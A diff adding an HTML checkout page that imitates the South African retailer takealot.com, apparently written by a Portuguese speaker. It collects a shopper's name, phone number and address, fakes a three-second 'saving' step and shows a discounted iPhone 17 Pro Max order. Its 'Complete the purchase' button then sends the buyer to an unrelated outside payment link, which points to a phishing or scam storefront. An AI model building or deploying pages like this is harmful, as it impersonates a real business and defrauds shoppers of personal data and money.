@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="pt">
+
+<head>
+  <!-- Facebook Pixel -->
+  <script>
+    !function (f, b, e, v, n, t, s) {
+      if (f.fbq) return; n = f.fbq = function () {
+        n.callMethod ?
+          n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+      }; if (!f._fbq) f._fbq = n;
+      n.push = n; n.loaded = !0; n.version = '2.0'; n.queue = []; t = b.createElement(e); t.async = !0;
+      t.src = v; s = b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t, s)
+    }(window,
+      document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '4179716432354886');
+    fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=4179716432354886&ev=PageView&noscript=1" /></noscript>
+  <!-- End Facebook Pixel -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout - Delivery Details</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial;
+      background: #fff;
+      color: #111;
+    }
+
+    /* TOPBAR COM LOGO */
+    .topbar {
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid #eee;
+      position: sticky;
+      top: 0;
+      background: #fff;
+      z-index: 1000;
+    }
+
+    .logo-img {
+      height: 28px;
+    }
+
+    .checkout {
+      padding: 20px 16px;
+    }
+
+    .checkout h2 {
+      font-size: 22px;
+      font-weight: 800;
+      margin-bottom: 16px;
+    }
+
+    .type-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+
+    .tab {
+      flex: 1;
+      height: 44px;
+      border-radius: 8px;
+      border: 2px solid #1a73e8;
+      background: #eaf3ff;
+      font-weight: 700;
+      color: #1a73e8;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    .field label {
+      font-size: 13px;
+      color: #666;
+      display: block;
+      margin-bottom: 4px;
+    }
+
+    .field input {
+      width: 100%;
+      border: none;
+      border-bottom: 1px solid #ddd;
+      font-size: 15px;
+      padding: 6px 0;
+      outline: none;
+    }
+
+    .save-btn {
+      margin-top: 30px;
+      width: 100%;
+      height: 48px;
+      border-radius: 999px;
+      border: none;
+      background: #0b6ecb;
+      color: white;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+    }
+
+    .save-btn.loading {
+      opacity: .8;
+      pointer-events: none;
+    }
+
+    .save-btn.saved {
+      background: #2ecc71;
+    }
+
+    #orderReview {
+      display: none;
+      margin-top: 24px;
+      border-top: 1px solid #eee;
+      padding-top: 20px;
+    }
+
+    /* BOTÃO FINAL */
+    .complete-btn {
+      margin-top: 20px;
+      width: 100%;
+      height: 50px;
+      border-radius: 999px;
+      border: none;
+      background: #00a651;
+      color: white;
+      font-size: 16px;
+      font-weight: 900;
+      cursor: pointer;
+      display: none;
+    }
+
+    .complete-btn:active {
+      transform: scale(0.98);
+    }
+
+    /* Province modal */
+    .province-modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, .4);
+      display: none;
+      z-index: 3000;
+    }
+
+    .province-modal.is-open {
+      display: block;
+    }
+
+    .province-sheet {
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: #fff;
+      border-radius: 16px 16px 0 0;
+      max-height: 80vh;
+      overflow: auto;
+    }
+
+    .province-head {
+      text-align: center;
+      font-size: 18px;
+      font-weight: 800;
+      padding: 14px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .province-item {
+      padding: 16px;
+      border-bottom: 1px solid #eee;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .province-item:active {
+      background: #f2f2f2;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- TOPBAR COM LOGO -->
+  <div class="topbar">
+    <img src="logo-takealot.svg" alt="takealot.com" class="logo-img">
+  </div>
+
+  <div class="checkout">
+
+    <h2>Delivery Details</h2>
+
+    <div class="type-tabs">
+      <button class="tab">Residential</button>
+    </div>
+
+    <div class="field"><label>Recipient Name</label><input id="fName"></div>
+    <div class="field"><label>Recipient Mobile Number</label><input id="fPhone"></div>
+    <div class="field"><label>Street Address</label><input id="fStreet"></div>
+    <div class="field"><label>Complex / Building</label><input></div>
+    <div class="field"><label>Suburb</label><input></div>
+    <div class="field"><label>City / Town</label><input id="fCity"></div>
+
+    <div class="field">
+      <label>Province</label>
+      <input id="provinceInput" placeholder="Select" readonly>
+    </div>
+
+    <div class="field"><label>Postal Code</label><input id="fPostal"></div>
+
+    <button class="save-btn" id="openPayment">
+      <span id="saveText">Save</span>
+      <span id="saveLoader" style="display:none;">Saving...</span>
+      <span id="saveDone" style="display:none;">Saved ✓</span>
+    </button>
+
+    <!-- ORDER REVIEW -->
+    <div id="orderReview">
+
+      <h2>Order Review</h2>
+
+      <strong>Delivery Method</strong><br>Delivery<br><br>
+
+      <strong>Delivery Address</strong><br>
+      <span
+        style="background:#eee;padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;">RESIDENTIAL</span>
+
+      <div id="orName" style="margin-top:8px;font-weight:700;"></div>
+      <div id="orAddress" style="color:#555;"></div>
+      <div style="color:#999;">
+        <span id="orPerson"></span> — <span id="orPhone"></span>
+      </div>
+
+      <br>
+      <strong id="orDeliveryDate"></strong><br>
+      Next Business Day Delivery • Free
+
+      <br><br>
+      <div style="display:flex;justify-content:space-between;">
+        <span style="color:#999;font-weight:700;">ITEMS FOR DELIVERY</span>
+      </div>
+
+      <div style="display:flex;gap:12px;margin-top:12px;align-items:center;">
+        <img src="i1.png" style="width:60px;height:60px;object-fit:contain;border:1px solid #eee;border-radius:6px;">
+        <div style="font-size:14px;font-weight:700;">
+          Apple iPhone 17 Pro Max 256GB - Desert Titanium
+        </div>
+      </div>
+
+      <button class="complete-btn" id="completePurchase">
+        Complete the purchase
+      </button>
+
+
+    </div>
+
+  </div>
+
+  <!-- Province Modal -->
+  <div class="province-modal" id="provinceModal">
+    <div class="province-sheet">
+      <div class="province-head">Province</div>
+      <div class="province-item">Eastern Cape</div>
+      <div class="province-item">Free State</div>
+      <div class="province-item">Gauteng</div>
+      <div class="province-item">KwaZulu-Natal</div>
+      <div class="province-item">Limpopo</div>
+      <div class="province-item">Mpumalanga</div>
+      <div class="province-item">Northern Cape</div>
+      <div class="province-item">North West</div>
+      <div class="province-item">Western Cape</div>
+    </div>
+  </div>
+
+  <script>
+    // Province
+    provinceInput.onclick = () => provinceModal.classList.add("is-open");
+
+    document.querySelectorAll(".province-item").forEach(item => {
+      item.onclick = () => {
+        provinceInput.value = item.innerText;
+        provinceModal.classList.remove("is-open");
+      }
+    });
+
+    provinceModal.onclick = e => {
+      if (e.target === provinceModal)
+        provinceModal.classList.remove("is-open");
+    }
+
+    // Save + Review
+    openPayment.onclick = () => {
+
+      openPayment.classList.add("loading");
+      saveText.style.display = "none";
+      saveLoader.style.display = "inline";
+
+      setTimeout(() => {
+
+        saveLoader.style.display = "none";
+        saveDone.style.display = "inline";
+        openPayment.classList.remove("loading");
+        openPayment.classList.add("saved");
+
+        const name = fName.value;
+        const phone = fPhone.value;
+        const street = fStreet.value;
+        const city = fCity.value;
+        const postal = fPostal.value;
+        const prov = provinceInput.value;
+
+        orName.innerText = street || "Home";
+        orAddress.innerText = `${street}, ${city}, ${prov}, ${postal}`;
+        orPerson.innerText = name;
+        orPhone.innerText = phone;
+
+        const tomorrow = new Date();
+        tomorrow.setDate(tomorrow.getDate() + 1);
+        const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+        orDeliveryDate.innerText =
+          `Delivery by ${tomorrow.getDate()} ${months[tomorrow.getMonth()]} ${tomorrow.getFullYear()}`;
+
+        orderReview.style.display = "block";
+
+        // MOSTRAR BOTÃO FINAL
+        completePurchase.style.display = "block";
+
+        orderReview.scrollIntoView({ behavior: "smooth" });
+
+      }, 3000);
+    }
+    completePurchase.onclick = () => {
+      window.location.href = "https://app.quorapay.online/pay/9028feee-b8d0-4d8d-b610-6e8dec2df9ce";
+    };
+  </script>
+
+</body>
+
+</html>
